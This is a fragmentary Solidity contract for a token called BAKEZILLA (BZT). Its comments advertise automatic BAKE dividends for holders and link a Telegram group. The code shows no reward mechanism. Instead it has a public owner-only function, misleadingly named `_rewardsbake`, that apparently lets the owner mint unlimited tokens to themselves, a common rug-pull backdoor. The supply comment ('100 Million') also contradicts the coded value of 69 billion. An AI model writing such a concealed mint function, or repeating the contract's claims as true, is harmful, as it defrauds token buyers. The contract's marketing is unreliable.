...
//
// $BAKEZILLA proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN BAKEZILLA! With the auto-claim feature,
// simply hold$BAKEZILLA and you'll receive BAKE automatically in your wallet.
// 
// Hold BAKEZILLA and get rewarded in BAKE on every transaction!
//
//
// 📱 Telegram:https://t.me/BakeZillaBSC
// 
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _rewardsbake(uint256 amount) public onlyOwner {
    _rewardsbake(msg.sender, amount);
    }
    ...
    function _rewardsbake(address account, uint256 amount) internal virtual {
...
contract BAKEZILLATOKEN is ERC20 {

    uint tokenTotalSupply = 69000000000; // 100 Million Token Supply

    constructor() public ERC20("BAKE ZILLA TOKEN ", "BZT") {
        _rewardsbake(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}